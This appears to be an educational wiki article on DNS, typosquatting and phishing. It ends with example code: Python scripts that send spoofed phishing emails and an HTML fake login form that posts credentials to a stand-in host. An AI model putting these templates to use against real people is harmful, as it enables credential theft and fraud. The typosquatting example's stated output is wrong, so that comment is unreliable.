---

layout: col-sidebar
title: DNS Attacks_Phishing_TypoSquatting
author: ChennaRao Vemula
contributors: 
permalink: /attacks/DNS Attacks_Phishing_TypoSquatting.md
tags: DNS, Typosquatting, Phishing

---

{% include writers.html %}

## DNS Infrastructure
## What Is DNS
The acronym DNS stands for “Domain Name System”.
To better relate to this you can think of it as an “address book” where you look up a name that is tied to a unique address that you use for communicating with an individual, however this “address book” is for the internet and when you enter a domain name into a browser, it will be translated to the tied unique IP address which it will use to communicate to a machine and serve up content that is hosted on it The process of translating a domain to an IP address is known as a DNS lookup. DNS lookups are performed by dedicated servers called DNS resolvers. Your Wi-Fi router is typically preconfigured to send DNS queries to the resolver owned by your ISP. However, you can choose to configure your router, operating system, or browser to use a different resolver.
## Components of DNS Infrastructure
1.	DNS Servers: These are the backbone of DNS. DNS servers come in various types, such as recursive resolvers and authoritative servers. Recursive resolvers act like your personal investigators, fetching IP addresses on your behalf. Authoritative servers, on the other hand, have the answers. They hold the official records for a specific domain, and they’re the ones you turn to when you need the precise IP address for a particular website.
2.	DNS Resolvers: Think of DNS resolvers as your web browsers’ trusty assistants. When you type in a website address, the resolver is the first to spring into action. It contacts DNS servers to find the IP address for the site you want to visit. This crucial step ensures you reach your desired destination on the web.
The role of DNS records and Zone files:
1.	DNS Records: If DNS is the backbone, DNS records are the words in the backbone’s language. These records store essential information, like IP addresses, mail server data, and aliases. Common record types include A (Address), CNAME (Canonical Name), and MX (Mail Exchange). These records tell DNS servers where to send your requests and emails and how to find websites.
2.	Zone Files: Imagine zone files as the organizers of the DNS library. Each domain has its zone file, which contains records that point to where the data for that domain is stored. These files are managed by domain administrators and provide authoritative DNS servers with the information they need to resolve queries for that domain. Zone files are essential for the smooth operation of DNS.
## Challenges
## Typosquatting
Typosquatting is when someone registers a domain name that is an intentionally misspelled version of another popular website. While many misspelled URLs won’t work or will redirect you, some of these fake websites that look real might be a source of malware, and visiting them could even lead to identity theft. Threat actors create and register domains similar to popular websites but with common typographical errors to exploit unsuspecting users who mistype URLs. The technique is similar to lookalike domains. But unlike lookalike domains in which attackers register domains that look confusingly similar to those of trusted brands typosquatting tries to cash in on users’ clumsiness with their keyboard.
## IP Infringement
Intellectual property (IP) infringement is the unauthorized use of a protected intellectual property right, such as a trademark, patent, copyright, industrial design, plant breeder’s right, or trade secret. Although intellectual-property infringement can be unintentional, it still unacceptable under the eyes of the law. The most common examples of intellectual property disputes include using another person’s words, images, or logo without the property owner’s permission
## Phishing
Phishing is a common type of cyber-attack that targets individuals through email, text messages, phone calls, and other forms of communication. A phishing attack aims to trick the recipient into falling for the attacker’s desired action, such as revealing financial information, system login credentials, or other sensitive information. As a popular form of social engineering, phishing involves psychological manipulation and deception whereby threat actors masquerade as reputable entities to mislead users into performing specific actions. These actions often involve clicking links to fake websites, downloading and installing malicious files, and divulging private information, like bank account numbers or credit card information.

![Phishing](https://github.com/PaV1nShAj1/PaV1nShAj1/blob/3b9c75abb93b91ad9320a5d3c9e6121eebb7a9e6/Screenshot%202025-01-20%20011021.jpg)
## How does phishing works
Phishing works by sending messages that look like they are from a legitimate company or website. Phishing messages will usually contain a link that takes the user to a fake website that looks like the real thing. The user is then asked to enter personal information, such as their credit card number. This information is then used to steal the person’s identity or to make fraudulent charges on their credit card
                             
![working](https://github.com/PaV1nShAj1/PaV1nShAj1/blob/3b9c75abb93b91ad9320a5d3c9e6121eebb7a9e6/phising.jpg)
## Types of Phishing attacks
## Spear phishing
Spear phishing involves targeting a specific individual in an organization to try to steal their login credentials. The attacker often first gathers information about the person before starting the attack, such as their name, position, and contact details.
## Email Phishing
Email phishing is a common technique used by attackers to trick individuals into providing sensitive information by pretending to be a trustworthy entity.
## Website Phishing
Website phishing is a method used by attackers to create fake websites that mimic legitimate ones to trick users into divulging sensitive information, such as login credentials or financial details.


# Example of TypoSquatting
```python
domain = "legit-website.com"
phishing_domain = domain.replace("i", "l")  # Replacing 'i' with 'l'
print(phishing_domain)  # Outputs: "leglt-website.com"```





# Example of Spear Phishing Email Code
```python
import smtplib
from email.mime.text import MIMEText

def send_spear_phishing_email(target_name, target_email):
    sender = "fake@legitcompany.com"
    subject = f"Important Update for {target_name}"
    body = f"Dear {target_name},\n\nPlease click the link to update your account information: http://fake-website.com"

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = target_email

    with smtplib.SMTP('smtp.example.com') as server:
        server.login("username", "password")
        server.sendmail(sender, target_email, msg.as_string())```

# Example of Phishing Email Code
```python
import smtplib
from email.mime.text import MIMEText

def send_phishing_email():
    sender = "fake@legitcompany.com"
    recipient = "victim@example.com"
    subject = "Important Update"
    body = "Please click the link to update your account information: http://fake-website.com"

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = recipient

    with smtplib.SMTP('smtp.example.com') as server:
        server.login("username", "password")
        server.sendmail(sender, recipient, msg.as_string())

# Example of Website Phishing
```html
<!-- Example of a fake login page -->
<html>
<head>
    <title>Fake Login Page</title>
</head>
<body>
    <h1>Login</h1>
    <form action="http://fake-website.com/submit" method="post">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username"><br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
</body>
</html>```
 

